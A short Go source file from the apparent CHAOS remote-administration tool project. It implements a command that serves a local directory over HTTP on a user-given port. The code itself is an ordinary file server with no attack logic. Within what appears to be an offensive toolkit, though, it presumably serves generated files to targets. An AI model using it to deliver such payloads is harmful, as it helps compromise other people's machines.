package serve

import (
	"flag"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/ui"
	"net/http"
)

type ServeUseCase struct{}

func NewServeUseCase() usecase.Serve {
	return &ServeUseCase{}
}

func (s ServeUseCase) ServeDirectory(values []string) {
	if len(values) <= 1 {
		fmt.Println(color.Yellow, "[!] You should specify a port!")
		return
	}

	system.ClearScreen()
	ui.ShowLogo()

	servePort := flag.String("", values[1], "")
	serveDir := flag.String("d", ".", "CHAOS Directory")
	flag.Parse()

	http.Handle("/", http.FileServer(http.Dir(*serveDir)))

	log.Printf("Serving directory %s on HTTP port: %s\n\n", *serveDir, *servePort)
	go serve(servePort)
}

func serve(serverPort *string) {
	log.Fatal(http.ListenAndServe(":"+*serverPort, nil))
}
